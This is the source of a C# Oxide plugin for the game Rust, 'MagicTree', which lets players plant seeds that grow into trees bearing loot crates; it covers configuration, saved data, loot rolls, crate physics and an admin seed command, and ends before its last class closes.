using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Game.Rust.Cui;
using System;
using System.Collections.Generic;
using System.Linq;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("MagicTree", "rust-plug.ru", "1.3.42 fix")]
    public class MagicTree : RustPlugin
    {
        #region Configuration
        public class Seed
        {
            public string shortname;
            public string name;
            public ulong skinId;
        }

        public class Wood
        {
            [JsonProperty("UID Дерева")]
            public ulong woodId;
            [JsonProperty("Осталось времени")]
            public int NeedTime;

            [JsonProperty("Оставшееся время до разрушения")]
            public int NeedTimeToDestroy = -1;
            [JsonProperty("Этап")]
            public int CurrentStage;
            [JsonProperty("Позиция")]
            public Vector3 woodPos;
            [JsonProperty("Ящики")]
            public List<ulong> BoxListed = new List<ulong>();
            [JsonIgnore] public List<BaseEntity> boxes = new List<BaseEntity>();
        }

        public class BoxItemsList
        {
            [JsonProperty("Shortname предмета")]
            public string ShortName;
            [JsonProperty("Минимальное количество")]
            public int MinAmount;
            [JsonProperty("Максимальное количество")]
            public int MaxAmount;
            [JsonProperty("Шанс что предмет будет добавлен (максимально 100%)")]
            public int Change;
            [JsonProperty("SkinID предмета")]
            public ulong SkinID;
            [JsonProperty("Имя предмета при создании (Оставьте поле пустым чтобы использовать стандартное название итема)")]
            public string Name;
            [JsonProperty("Это чертеж")]
            public bool IsBlueprnt;
        }


        public Dictionary<ulong, Dictionary<ulong, Wood>> WoodsList = new Dictionary<ulong, Dictionary<ulong, Wood>>();

        public Dictionary<string, string> Messages = new Dictionary<string, string>()
        {
            {"CmdError", "Неправильно ввели команду." },
            {"DisablePlantSeed", "Семена разрешено садить только в землю" },
             {"DisableAuthSeed", "Семена запрещено садить в зоне чужой постройки" },
            {"CountError", "Неверное кол-во!" },
            {"Permission", "У вас нет прав!" },
            {"SeedGived", "Вам выпала семечка магического дерева!\nПосадите ее и у вас выростет необычное дерево на каком растут ящики с ценными предметами!" },
            {"Wood", "Вы посадили магическое дерево\nСкоро оно вырастет, и даст плоды!" },
            {"InfoTextFull",  "<size=25><b>Магическое дерево</b></size>\n<size=17>\nПЛОДЫ ДОЗРЕЛИ, ВЫ МОЖЕТЕ ИХ СОБРАТЬ</size>"},
            {"InfoDdraw", "<size=25><b>Магическое дерево</b></size>\n<size=17>Этап созревания дерева: {0}/{1}\n\nВремя до полного созревания: {2}</size>" }
        };

        private PluginConfig config;
        protected override void LoadDefaultConfig()
        {

            config = PluginConfig.DefaultConfig();
        }

        protected override void LoadConfig()
        {
            base.LoadConfig();
            config = Config.ReadObject<PluginConfig>();

            if (config.PluginVersion < Version)
                UpdateConfigValues();

            Config.WriteObject(config, true);
        }

        private void UpdateConfigValues()
        {
            PluginConfig baseConfig = PluginConfig.DefaultConfig();
            if (config.PluginVersion < Version)
            {
                PrintWarning("Config update detected! Updating config values...");
                PrintWarning("Config update completed!");
            }
            config.PluginVersion = Version;
        }

        protected override void SaveConfig()
        {
            Config.WriteObject(config);
        }

        private class PluginConfig
        {
            [JsonProperty("Время роста дерева в секундах")]
            public int Time;

            [JsonProperty("Время существования дерева после полного созревания")]
            public int TimetoDestroy = 3600;

            [JsonProperty("Посадка деревьев разрешена только в земле (запрещены плантации и прочее)")]
            public bool PlanterBoxDisable = true;

            [JsonProperty("Множитель добычи при финальной срубке магического дерева")]
            public int Bonus = 1;

            [JsonProperty("Радиус спавна ящиков по вертикали (5 стандарт)")]
            public float VerticalRadius = 5;


            [JsonProperty("Радиус спавна ящиков по горизонтали (5 стандарт)")]
            public float HorizontalRadius = 5;

            [JsonProperty("Количество вещей в ящике")]
            public int ItemsCount;

            [JsonProperty("Кол-во ящиков на дереве")]
            public int BoxCount;

            [JsonProperty("Список префабов этапов дерева")]
            public List<string> Stages;

            [JsonProperty("Права на выдачу")]
            public string Permission = "seed.perm";

            [JsonProperty("Тип ящика")]
            public string CrateBasic = "assets/bundled/prefabs/radtown/crate_elite.prefab";

            [JsonProperty("Шанс выпадения зерна с дерева (макс-100)")]
            public int Chance;

            [JsonProperty("Настройка лута в ящиках")]
            public List<BoxItemsList> casesItems;
            [JsonProperty("Ссылка на удачный эффект")]
            public string SucEffect;
            [JsonProperty("Ссылка на эффект ошибки")]
            public string ErrorEffect;
            [JsonProperty("Настройка зерна")]
            public Seed seed;
            [JsonProperty("Версия конфигурации")]
            public VersionNumber PluginVersion = new VersionNumber();

            public static PluginConfig DefaultConfig()
            {
                return new PluginConfig()
                {
                    PluginVersion = new VersionNumber(),
                    ItemsCount = 2,
                    Permission = "MagicTree.perm",
                    CrateBasic = "assets/bundled/prefabs/radtown/crate_underwater_basic.prefab",
                    BoxCount = 4,
                    Chance = 5,
                    Time = 10,
                    seed = new Seed()
                    {
                        shortname = "seed.hemp",
                        name = "Семена магического дерева",
                        skinId = 1787823357
                    },
                    casesItems = new List<BoxItemsList>()
                {
                new BoxItemsList
                {
                ShortName = "stones",
                MinAmount = 300,
                MaxAmount = 1000,
                Change = 100,
                Name = "",
                SkinID = 0,
                IsBlueprnt = false
                },
                },
                    SucEffect = "assets/prefabs/misc/xmas/candy cane club/effects/hit.prefab",
                    ErrorEffect = "assets/prefabs/locks/keypad/effects/lock.code.denied.prefab",
                    Stages = new List<string>()
                    {
                        "assets/prefabs/plants/hemp/hemp.entity.prefab",
                        "assets/bundled/prefabs/autospawn/resource/v3_temp_field/birch_tiny_temp.prefab",
                        "assets/bundled/prefabs/autospawn/resource/v3_temp_field/american_beech_e.prefab",
                        "assets/bundled/prefabs/autospawn/resource/v3_temp_field/oak_e.prefab",
                        "assets/bundled/prefabs/autospawn/resource/v3_temp_field_large/oak_b.prefab"
                    },
                };
            }
        }
        #endregion

        #region Oxide

        void LoadData()
        {
            try
            {
                WoodsList = Interface.GetMod().DataFileSystem.ReadObject<Dictionary<ulong, Dictionary<ulong, Wood>>>($"MagiсTree_Players");
                if (WoodsList == null)
                    WoodsList = new Dictionary<ulong, Dictionary<ulong, Wood>>();
            }
            catch
            {
                WoodsList = new Dictionary<ulong, Dictionary<ulong, Wood>>();
            }
        }

        void SaveData()
        {
            if (WoodsList != null)
                Interface.Oxide.DataFileSystem.WriteObject($"MagiсTree_Players", WoodsList);
        }

        public static MagicTree ins;

        void OnEntityKill(TreeEntity entity)
        {
            if (entity == null || entity?.net.ID == null || entity.OwnerID == 0) return;
            if (entity.GetComponent<TreeEntity>() != null)
            {
                var tree = entity.GetComponent<TreeEntity>();
                if (WoodsList.ContainsKey(tree.OwnerID) && WoodsList[tree.OwnerID].ContainsKey(tree.net.ID.Value))
                {
                    var woodData = WoodsList[tree.OwnerID][tree.net.ID.Value];
                    
                    // Отсоединяем все ящики от дерева при его уничтожении
                    if (woodData != null && woodData.boxes != null)
                    {
                        foreach (var box in woodData.boxes)
                        {
                            if (box != null && !box.IsDestroyed)
                            {
                                BoxHanger hanger = box.gameObject.GetComponent<BoxHanger>();
                                if (hanger != null)
                                    hanger.DetachBox();
                            }
                        }
                    }
                    
                    WoodsList[tree.OwnerID].Remove(tree.net.ID.Value);
                }
            }
        }

        void OnServerSave()
        {
            SaveData();
        }

        void Loaded()
        {
            ins = this;
            permission.RegisterPermission(config.Permission, this);
            lang.RegisterMessages(Messages, this, "en");
            Messages = lang.GetMessages("en", this);
            LoadData();
        }

        private void OnServerInitialized()
        {
            BackupData();
            foreach (var tree in WoodsList)
            {
                foreach (var entity in tree.Value.Keys)
                {
                    BaseNetworkable entitys = BaseNetworkable.serverEntities.Find(new NetworkableId(entity));
                    if (entitys != null && entitys is TreeEntity)
                        AddOrRemoveComponent("add", null, entitys.GetComponent<TreeEntity>(), entitys.GetComponent<TreeEntity>().OwnerID);
                    else if (entitys != null && entitys is GrowableEntity)
                        AddOrRemoveComponent("add", null, entitys.GetComponent<GrowableEntity>(), entitys.GetComponent<GrowableEntity>().OwnerID);
                    else
                        NextTick(() => { tree.Value.Remove(entity); });
                }
            }
        }


        private List<TreeConponent> treeConponents = new List<TreeConponent>();


        void AddOrRemoveComponent(string type = "", TreeConponent component = null, BaseEntity tree = null, ulong playerid = 0)
        {
            if (!WoodsList.ContainsKey(playerid)) return;
            switch (type)
            {
                case "add":
                    if (!WoodsList[playerid].ContainsKey(tree.net.ID.Value)) return;
                    var data = WoodsList[playerid][tree.net.ID.Value];
                    if (tree != null && data != null)
                    {
                        if (WoodsList[playerid][tree.net.ID.Value].CurrentStage > 2 && WoodsList[playerid][tree.net.ID.Value].BoxListed.Count > 0)
                        {
                            GameObject treeObject = new GameObject();
                            treeObject.transform.position = tree.transform.position;
                            treeObject.AddComponent<TreeConponent>().Init(WoodsList[playerid][tree.net.ID.Value], tree);
                            treeConponents.Add(treeObject.GetComponent<TreeConponent>());
                            SpawnBox(data, WoodsList[playerid][tree.net.ID.Value].BoxListed.Count, tree, playerid, WoodsList[playerid][tree.net.ID.Value].BoxListed.Count);
                            return;
                        }
                        else
                        {
                            GameObject treeObject = new GameObject();
                            treeObject.transform.position = tree.transform.position;
                            treeObject.AddComponent<TreeConponent>().Init(WoodsList[playerid][tree.net.ID.Value], tree);
                            treeConponents.Add(treeObject.GetComponent<TreeConponent>());
                        }
                    }
                    break;
                case "remove":

                    if (component == null || component.IsDestroyed) return;
                    if (WoodsList[playerid][tree.net.ID.Value].BoxListed.Count > 0)
                    {
                        foreach (var ent in WoodsList[playerid][tree.net.ID.Value].boxes)
                        {
                            if (ent != null && !ent.IsDestroyed)
                                ent.Kill();
                        }
                        WoodsList[playerid][tree.net.ID.Value].boxes.Clear();
                        if (component != null)
                            component.DestroyComponent();
                    }
                    else
                    {
                        if (component != null)
                            component.DestroyComponent();
                    }
                    break;
            }
        }

        void OnEntityBuilt(Planner planner, GameObject gameobject)
        {
            if (planner == null || gameobject == null) return;
            var player = planner.GetOwnerPlayer();
            if (player == null) return;
            BaseEntity entity = gameobject.ToBaseEntity();
            if (entity == null) return;
            if (entity.skinID == config.seed.skinId)
            {
                NextTick(() =>
                {
                    if (entity != null && !entity.IsDestroyed)
                    {
                        if (player.GetBuildingPrivilege()?.IsAuthed(player) == false)
                        {
                            SendReply(player, Messages["DisableAuthSeed"]);
                            AddSeed(player, 1, false);
                            NextTick(() => entity?.Kill());
                            return;
                        }
                        if (config.PlanterBoxDisable && entity.GetParentEntity() != null)
                        {
                            if (player == null) return;
                            SendReply(player, Messages["DisablePlantSeed"]);
                            AddSeed(player, 1, false);
                            NextTick(() => entity.Kill());
                            return;
                        }

                        SpawnWood(player.userID, entity.transform.position, null, entity, null);
                        SendReply(player, string.Format(Messages["Wood"]));
                    }
                });
            }
        }

        object OnDispenserBonus(ResourceDispenser dispenser, BasePlayer player, Item item)
        {
            if (dispenser == null || player == null || item == null) return null;
            if (dispenser.gatherType == ResourceDispenser.GatherType.Tree)
            {
                if (UnityEngine.Random.Range(0f, 100f) < config.Chance)
                    AddSeed(player, 1);
                if (config.Bonus > 1)
                {
                    TreeEntity wood1 = dispenser.GetComponentInParent<TreeEntity>();
                    if (wood1 == null) return null;
                    if (!treeConponents.Any(p => p.tree == wood1)) return null;
                    var treeComponent = treeConponents.Find(p => p.tree == wood1);
                    if (wood1 != null && treeComponent != null)
                        item.amount = item.amount * config.Bonus;
                }
            }


            return null;
        }
        object OnDispenserGather(ResourceDispenser dispenser, BasePlayer player, Item item)
        {
            if (dispenser == null || item == null || player == null) return null;
            if (dispenser.gatherType == ResourceDispenser.GatherType.Tree)
            {
                TreeEntity wood1 = dispenser.GetComponentInParent<TreeEntity>();
                if (wood1 == null || wood1.OwnerID == 0 || !treeConponents.Any(p => p.tree == wood1)) return null;
                var treeComponent = treeConponents.Find(p => p.tree == wood1);
                if (wood1 != null && treeComponent != null)
                {
                    var component = treeComponent;
                    if (component.data.boxes.Count > 0 && component.data.boxes.Count < 5)
                    {
                        var box = component.data.boxes.Last();
                        if (box != null && component.data.CurrentStage == config.Stages.Count)
                        {
                            // Отсоединяем ящик от дерева
                            BoxHanger hanger = box.gameObject.GetComponent<BoxHanger>();
                            if (hanger != null)
                                hanger.DetachBox();
                            
                            box.SetFlag(BaseEntity.Flags.Busy, false, true);
                            component.data.BoxListed.Remove(box.net.ID.Value);
                            component.data.boxes.Remove(box);
                        }
                        return false;
                    }
                    else if (component.data.BoxListed.Count > 5 && component.data.CurrentStage == config.Stages.Count)
                    {
                        // Отсоединяем все ящики от дерева
                        foreach (var box in component.data.boxes)
                        {
                            if (box != null)
                            {
                                BoxHanger hanger = box.gameObject.GetComponent<BoxHanger>();
                                if (hanger != null)
                                    hanger.DetachBox();
                                
                                box.SetFlag(BaseEntity.Flags.Busy, false, true);
                                component.data.BoxListed.Remove(box.net.ID.Value);
                            }
                        }
                        component.data.BoxListed.Clear();
                        component.data.boxes.Clear();
                        return false;
                    }
                    else
                    {
                        if (component.data.CurrentStage == config.Stages.Count)
                        {
                            // При финальной срубке - отсоединяем все ящики
                            foreach (var box in component.data.boxes)
                            {
                                if (box != null && !box.IsDestroyed)
                                {
                                    BoxHanger hanger = box.gameObject.GetComponent<BoxHanger>();
                                    if (hanger != null)
                                        hanger.DetachBox();
                                }
                            }
                            
                            dispenser.AssignFinishBonus(player, 1, null);
                            HitInfo hitInfo = new HitInfo(player, wood1, Rust.DamageType.Generic, wood1.Health(), wood1.transform.position);
                            wood1.OnAttacked(hitInfo);

                            return false;
                        }

                    }
                }
            }
            return null;
        }



        public class BoxHanger : MonoBehaviour
        {
            BaseEntity box;
            BaseEntity tree;
            Rigidbody boxRb;
            Vector3 localOffset;
            bool isDetached = false;

            public void Init(BaseEntity boxEntity, BaseEntity treeEntity)
            {
                box = boxEntity;
                tree = treeEntity;
                
                boxRb = box.GetComponent<Rigidbody>();
                if (boxRb == null)
                {
                    boxRb = box.gameObject.AddComponent<Rigidbody>();
                }
                
                // Вычисляем локальное смещение относительно дерева
                localOffset = tree.transform.InverseTransformPoint(box.transform.position);
                
                // Настраиваем физику ящика - делаем kinematic для удержания на месте
                // Kinematic тела можно безопасно перемещать через transform.position
                boxRb.useGravity = false;
                boxRb.isKinematic = true; // Делаем kinematic - это правильный способ для статичных объектов
                
                // Проверяем состояние дерева каждые 0.5 секунды
                InvokeRepeating(nameof(CheckTreeState), 0.5f, 0.5f);
            }

            void Update()
            {
                if (isDetached || box == null || box.IsDestroyed || tree == null || tree.IsDestroyed)
                    return;
                
                // Для kinematic тел безопасно обновлять позицию через transform.position
                Vector3 targetPosition = tree.transform.TransformPoint(localOffset);
                box.transform.position = targetPosition;
            }

            void CheckTreeState()
            {
                if (box == null || box.IsDestroyed)
                {
                    Destroy(this);
                    return;
                }

                // Если дерево уничтожено или отсоединено - освобождаем ящик
                if (tree == null || tree.IsDestroyed || isDetached)
                {
                    DetachBox();
                }
            }

            public void DetachBox()
            {
                if (isDetached) return;
                isDetached = true;

                if (boxRb != null)
                {
                    // Включаем физику для падения
                    boxRb.isKinematic = false;
                    boxRb.useGravity = true;
                    boxRb.mass = 10f;
                    boxRb.drag = 0.5f; // Небольшое сопротивление воздуха
                    boxRb.angularDrag = 2f; // Сопротивление вращению
                    boxRb.collisionDetectionMode = CollisionDetectionMode.ContinuousDynamic;
                    
                    // Добавляем случайную силу для реалистичного падения как яблоко
                    // Случайное направление вниз и немного в стороны
                    Vector3 randomDirection = new Vector3(
                        UnityEngine.Random.Range(-1.5f, 1.5f), // Случайное отклонение по X
                        UnityEngine.Random.Range(-2f, -0.5f), // Направление вниз (отрицательное Y)
                        UnityEngine.Random.Range(-1.5f, 1.5f)  // Случайное отклонение по Z
                    ).normalized;
                    
                    // Применяем силу для разлета
                    float force = UnityEngine.Random.Range(3f, 8f);
                    boxRb.AddForce(randomDirection * force, ForceMode.VelocityChange);
                    
                    // Добавляем случайное вращение для реалистичности
                    Vector3 randomTorque = new Vector3(
                        UnityEngine.Random.Range(-5f, 5f),
                        UnityEngine.Random.Range(-5f, 5f),
                        UnityEngine.Random.Range(-5f, 5f)
                    );
                    boxRb.AddTorque(randomTorque, ForceMode.VelocityChange);
                }

                // Добавляем компонент для проверки приземления
                if (box != null && !box.IsDestroyed)
                {
                    box.gameObject.AddComponent<RigidbodyChecker>();
                }

                CancelInvoke();
            }

            void OnDestroy()
            {
                CancelInvoke();
            }
        }

        public class RigidbodyChecker : MonoBehaviour
        {
            BaseEntity check;       
            BaseEntity parentTree;  
            Rigidbody body;

            float groundOffset = 0.05f; 
            float checkRate = 0.5f;

            bool grounded = false;
            bool unlocked = false;

            void Awake()
            {
                check = GetComponent<BaseEntity>();
                body = GetComponent<Rigidbody>();          
                parentTree = check.GetParentEntity();
                check.SetFlag(BaseEntity.Flags.Reserved8, true, false);
                InvokeRepeating(nameof(UpdateFallingAndLockState), 0.2f, checkRate);
            }

            void UpdateFallingAndLockState()
            {
                if (check == null || check.IsDestroyed)
                {
                    Destroy(this);
                    return;
                }

                bool treeDestroyed = parentTree == null || parentTree.IsDestroyed;

                if (!grounded)
                {
                    Vector3 pos = check.transform.position;
                    float terrainY = TerrainMeta.HeightMap.GetHeight(pos);

                    if (pos.y - terrainY > 0.3f)
                    {
                        pos.y = terrainY + groundOffset;
                        check.transform.position = pos;

                        if (body != null)
                        {
                            body.isKinematic = true;
                            body.useGravity = false;
                            // Не устанавливаем velocity для kinematic тела - это вызывает ошибку
                            // body.velocity = Vector3.zero;
                        }

                        check.SendNetworkUpdateImmediate();
                        grounded = true;
                    }
                }
                if (treeDestroyed && !unlocked)
                {
                    check.SetFlag(BaseEntity.Flags.Reserved8, false, false); 
                    unlocked = true;
                
                }
                else if (!treeDestroyed && !check.HasFlag(BaseEntity.Flags.Reserved8))
                {
                    // Пока дерево стоит — блокируем взаимодействие
                    check.SetFlag(BaseEntity.Flags.Reserved8, true, false);
                }
            }

            void OnDestroy()
            {
                CancelInvoke();
            }
        }



        void Unload()
        {
            foreach (var tree in treeConponents)
                AddOrRemoveComponent("remove", tree, tree.tree, tree.tree.OwnerID);
            SaveData();
        }

        #endregion

        #region MyMethods

        public void SpawnWood(ulong player, Vector3 pos, BaseEntity tree, BaseEntity entity, TreeConponent oldComponent)
        {
            if (tree == null)
            {
                entity?.Kill();
                var Wood = GameManager.server.CreateEntity(config.Stages[0], pos);
                Wood.Spawn();
                Wood.OwnerID = player;


                if (!WoodsList.ContainsKey(player))

                    WoodsList.Add(player, new Dictionary<ulong, Wood>()
                    {
                        [Wood.net.ID.Value] = new Wood() { woodId = Wood.net.ID.Value, CurrentStage = 0, NeedTime = config.Time / config.Stages.Count, woodPos = Wood.transform.position }
                    });

                else
                    WoodsList[player].Add(Wood.net.ID.Value, new Wood() { woodId = Wood.net.ID.Value, CurrentStage = 0, NeedTime = config.Time / config.Stages.Count, woodPos = Wood.transform.position });
                GameObject treeObject = new GameObject();
                treeObject.transform.position = pos;
                treeObject.AddComponent<TreeConponent>().Init(WoodsList[player][Wood.net.ID.Value], Wood);
                treeConponents.Add(treeObject.GetComponent<TreeConponent>());
            }
            else
            {
                if (tree == null) return;
                var old = WoodsList[player][tree.net.ID.Value];
                var current = ++old.CurrentStage;
                TreeEntity Wood = GameManager.server.CreateEntity(config.Stages[current], pos) as TreeEntity;
                Wood.Spawn();
                Wood.GetComponent<TreeEntity>().OwnerID = player;
                if (WoodsList[player].ContainsKey(tree.net.ID.Value)) WoodsList[player].Remove(tree.net.ID.Value);

                WoodsList[player].Add(Wood.net.ID.Value, new Wood() { woodId = Wood.net.ID.Value, CurrentStage = current, NeedTime = config.Time / config.Stages.Count, woodPos = Wood.transform.position });

                GameObject treeObject = new GameObject();
                treeObject.transform.position = tree.transform.position;

                treeObject.AddComponent<TreeConponent>().Init(WoodsList[player][Wood.net.ID.Value], Wood);
                Wood.SendNetworkUpdateImmediate();
                treeConponents.Add(treeObject.GetComponent<TreeConponent>());
                tree.KillMessage();
                if (oldComponent != null && treeConponents.Contains(oldComponent))
                    treeConponents.Remove(oldComponent);
            }
        }


        [ChatCommand("seed")]
        void GiveSeed(BasePlayer player, string command, string[] args)
        {
            if (player.IsAdmin || permission.UserHasPermission(player.UserIDString, config.Permission))
            {
                if (args.Length == 1)
                {
                    int amount;
                    if (!int.TryParse(args[0], out amount))
                    {
                        SendReply(player, "Вы не указали количество, используйте /seed AMOUNT");

                        return;
                    }
                    AddSeed(player, amount, false);
                    return;
                }
                if (args.Length > 0 && args.Length == 2)
                {
                    var target = BasePlayer.Find(args[0]);
                    if (target == null)
                    {
                        SendReply(player, "Данный игрок не найден, попробуйте уточнить имя или SteamID, используйте /seed TARGETNAME/ID AMOUNT");
                        return;
                    }

                    int amount;
                    if (!int.TryParse(args[1], out amount))
                    {
                        SendReply(player, "Вы не указали количество, используйте /seed TARGETNAME/ID AMOUNT");
                        return;
                    }
                    AddSeed(target, amount);
                }
            }
            else
            {
                SendReply(player, string.Format(Messages["Permission"]));
                Effect.server.Run(config.ErrorEffect, player, 0, Vector3.zero, Vector3.forward);
            }
        }

        void AddSeed(BasePlayer player, int amount, bool messages = true)
        {
            if (player == null) return;
            Item sd = ItemManager.CreateByName(config.seed.shortname, amount, config.seed.skinId);
            sd.name = config.seed.name;
            player.GiveItem(sd, BaseEntity.GiveItemReason.Crafted);
            if (messages) SendReply(player, string.Format(Messages["SeedGived"]));
            Effect.server.Run(config.SucEffect, player, 0, Vector3.zero, Vector3.forward);
        }

 public void SpawnBox(Wood wood, int i, BaseEntity tree, ulong ownerID, int countBox = 0)
        {
            if (wood == null || tree == null) 
                return;

            if (wood != null)
            {
                wood.BoxListed.Clear();
                wood.boxes.Clear();
                if (countBox == 0) 
                    countBox = config.BoxCount;

                // Получаем размеры дерева для определения высоты веток
                Bounds treeBounds = tree.bounds;
                float treeHeight = treeBounds.size.y;
                float treeBaseY = tree.transform.position.y;
                float minHangingHeight = treeBaseY + treeHeight * 0.3f; // Минимальная высота подвешивания (30% от высоты дерева)
                float maxHangingHeight = treeBaseY + treeHeight * 0.85f; // Максимальная высота подвешивания (85% от высоты дерева)

                for (int count = 0; count < countBox; count++)
                {
                    Vector3 basePos = tree.transform.position;
                    
                    // Генерируем случайную позицию вокруг дерева
                    Vector2 randomCircle = UnityEngine.Random.insideUnitCircle * config.HorizontalRadius;
                    Vector3 horizontalOffset = new Vector3(randomCircle.x, 0, randomCircle.y);
                    
                    // Генерируем случайную высоту для подвешивания на ветках
                    float hangingHeight = UnityEngine.Random.Range(minHangingHeight, maxHangingHeight);
                    
                    // Ищем точку на дереве для подвешивания
                    // Используем raycast от центра дерева к случайной точке вокруг него
                    Vector3 targetPoint = basePos + horizontalOffset + Vector3.up * (hangingHeight - treeBaseY);
                    Vector3 rayDirection = (targetPoint - basePos).normalized;
                    float rayDistance = Vector3.Distance(basePos, targetPoint);
                    
                    RaycastHit hit;
                    Vector3 spawnPos;
                    
                    // Пытаемся найти точку на дереве, используя raycast от центра дерева
                    if (Physics.Raycast(basePos + Vector3.up * (hangingHeight - treeBaseY) * 0.5f, rayDirection, out hit, rayDistance + 2f))
                    {
                        // Если попали в дерево - используем эту точку, немного сместив наружу
                        spawnPos = hit.point + hit.normal * 0.3f;
                    }
                    else
                    {
                        // Если не попали - используем позицию на ветке дерева
                        spawnPos = basePos + horizontalOffset + Vector3.up * (hangingHeight - treeBaseY);
                    }
                    
                    // Создаем ящик
                    var boxed = GameManager.server.CreateEntity(config.CrateBasic, spawnPos, Quaternion.identity);
                    boxed.enableSaving = false;
                    LootContainer container = boxed.GetComponent<LootContainer>();
                    if (container != null)
                        container.initialLootSpawn = false;
                    boxed.Spawn();
                    
                    // Добавляем коллайдер если его нет
                    BoxCollider boxCollider = boxed.gameObject.GetComponent<BoxCollider>();
                    if (boxCollider == null)
                    {
                        boxCollider = boxed.gameObject.AddComponent<BoxCollider>();
                    }
                    
                    // Добавляем лут
                    AddLoot(boxed);
                    
                    // Настраиваем флаги - НЕ ставим Busy, чтобы ящик можно было открыть
                    boxed.SetFlag(BaseEntity.Flags.Reserved8, false, true);
                    // boxed.SetFlag(BaseEntity.Flags.Busy, true, true); // Убрали Busy чтобы можно было открывать
                    
                    // Добавляем в списки перед инициализацией BoxHanger
                    wood.BoxListed.Add(boxed.net.ID.Value);
                    wood.boxes.Add(boxed);
                    
                    // Подвешиваем ящик к дереву с небольшой задержкой для правильной инициализации
                    NextTick(() =>
                    {
                        if (boxed != null && !boxed.IsDestroyed && tree != null && !tree.IsDestroyed)
                        {
                            BoxHanger hanger = boxed.gameObject.AddComponent<BoxHanger>();
                            hanger.Init(boxed, tree);
                        }
                    });
                }
            }
        }


        public void AddLoot(BaseEntity box)
        {
            if (box == null) return;
            LootContainer container = box.GetComponent<LootContainer>();
            if (container == null) return;
            container.inventory.itemList.Clear();
            var List = new List<string>();
            for (int i = 0; i < (config.ItemsCount > config.casesItems.Count ? config.casesItems.Count : config.ItemsCount); i++)
            {
                var random = UnityEngine.Random.Range(1, 100);
                var item = config.casesItems.OrderBy(p => p.Change).Where(p => p.Change >= random && !List.Contains(p.ShortName)).ToList().GetRandom();
                if (item == null)
                    item = config.casesItems.OrderBy(p => p.Change).LastOrDefault(p => !List.Contains(p.ShortName));
                List.Add(item.ShortName);
                var amount = UnityEngine.Random.Range(item.MinAmount, item.MaxAmount);
                var newItem = item.IsBlueprnt ? ItemManager.CreateByName("blueprintbase") : ItemManager.CreateByName(item.ShortName, amount, item.SkinID);
                if (newItem == null)
                {
                    PrintError($"Предмет {item.ShortName} не найден!");
                    return;
                }

                if (item.IsBlueprnt)
                {
                    var bpItemDef = ItemManager.FindItemDefinition(ItemManager.CreateByName(item.ShortName, amount, item.SkinID).info.itemid);
                    if (bpItemDef == null)
                    {
                        PrintError($"Предмет {item.ShortName} для создания чертежа не найден!");
                        return;
                    }
                    newItem.blueprintTarget = bpItemDef.itemid;
                }

                if (!string.IsNullOrEmpty(item.Name))
                    newItem.name = item.Name;

                if (container.inventory.IsFull())
                    container.inventory.capacity++;
                newItem.MoveToContainer(container.inventory, -1);
            }
        }

        public class TreeConponent : BaseEntity
        {
            public BaseEntity tree;
            SphereCollider sphereCollider;
            public Wood data;

            void Awake()
            {
                sphereCollider = gameObject.GetComponent<SphereCollider>() ?? gameObject.AddComponent<SphereCollider>();
                sphereCollider.gameObject.layer = (int)Rust.Layer.Reserved1;
                sphereCollider.isTrigger = true;
                sphereCollider.radius = 4f;
            }

            public void Init(Wood wood, BaseEntity entity)
            {
                if (entity == null)
                {
                    Destroy(this);
                    return;
                }
                tree = entity;
                data = wood;
                InvokeRepeating(DrawInfo, 1f, 1);

            }

            public List<BasePlayer> PlayersTrigger = new List<BasePlayer>();


            void OnTriggerEnter(Collider other)
            {
                var target = other.GetComponentInParent<BasePlayer>();
                if (target != null)
                {
                    PlayersTrigger.RemoveAll(p => p == target);
                    PlayersTrigger.Add(target);
                }
            }

            void OnTriggerExit(Collider other)
            {
                var target = other.GetComponentInParent<BasePlayer>();
                if (target != null)
                    PlayersTrigger.RemoveAll(p => p == target);
            }

            void DrawInfo()
            {
                if (data == null || tree == null)
                {
                    Destroy(this);
                    return;
                }


                if (data.NeedTime <= 0 && data.CurrentStage == ins.config.Stages.FindIndex(x => x == ins.config.Stages.Last()) && data.BoxListed.ToList().Count <= 0)
                {
                    ins.SpawnBox(data, 3, tree, tree.OwnerID);
                    CreateInfo(tree.OwnerID);
                    data.CurrentStage = ins.config.Stages.Count;
                }
                if (data.NeedTime <= 0 && data.CurrentStage < ins.config.Stages.FindIndex(x => x == ins.config.Stages.Last()))
                {
                    ins.SpawnWood(tree.OwnerID, tree.transform.position, tree, null, this);
                }


                if (data.CurrentStage == ins.config.Stages.Count && data.BoxListed.ToList().Count > 0)
                {
                    data.NeedTimeToDestroy++;
                    if (data.NeedTimeToDestroy > ins.config.TimetoDestroy)
                    {
                        ins.WoodsList[tree.OwnerID].Remove(tree.net.ID.Value);
                        HitInfo hitInfo = new HitInfo(new BaseEntity(), tree, Rust.DamageType.Generic, tree.Health(), tree.transform.position);
                        tree.OnAttacked(hitInfo);
                        Destroy(this);
                    }
                }
                data.NeedTime--;

                PlayersTrigger.RemoveAll(p => Vector3.Distance(p.transform.position, tree.transform.position) > 4);
                foreach (var player in PlayersTrigger)
                {
                    DdrawInfo(player);
                }
            }


            void DdrawInfo(BasePlayer player)
            {

                if (player == null || !player.IsConnected) return;
                if (data.CurrentStage == ins.config.Stages.Count && data.BoxListed.ToList().Count > 0)
                {
                    if (player.Connection.authLevel < 2) SetPlayerFlag(player, BasePlayer.PlayerFlags.IsAdmin, true);
                    player.SendConsoleCommand("ddraw.text", 1.005f, Color.white, tree.transform.position + Vector3.up, ins.Messages["InfoTextFull"]);
                    if (player.Connection.authLevel < 2) SetPlayerFlag(player, BasePlayer.PlayerFlags.IsAdmin, false);
                    return;
                }

                if (data.NeedTime > 0)
                {
                    if (player.Connection.authLevel < 2) SetPlayerFlag(player, BasePlayer.PlayerFlags.IsAdmin, true);
                    player.SendConsoleCommand("ddraw.text", 1.005f, Color.white, tree.transform.position + Vector3.up, string.Format(ins.Messages["InfoDdraw"], data.CurrentStage + 1, ins.config.Stages.Count, FormatShortTime(TimeSpan.FromSeconds(data.NeedTime))));
                    if (player.Connection.authLevel < 2) SetPlayerFlag(player, BasePlayer.PlayerFlags.IsAdmin, false);
                }
            }

            void SetPlayerFlag(BasePlayer player, BasePlayer.PlayerFlags f, bool b)
            {
                if (b)
                {
                    if (player.HasPlayerFlag(f)) return;
                    player.playerFlags |= f;
                }
                else
                {
                    if (!player.HasPlayerFlag(f)) return;
                    player.playerFlags &= ~f;
                }
                player.SendNetworkUpdateImmediate();
            }


            public static string FormatShortTime(TimeSpan time)
            {
                string result = string.Empty;
                result += $"{time.Hours.ToString("00")}:";
                result += $"{time.Minutes.ToString("00")}:";
                result += $"{time.Seconds.ToString("00")}";
                return result;
            }

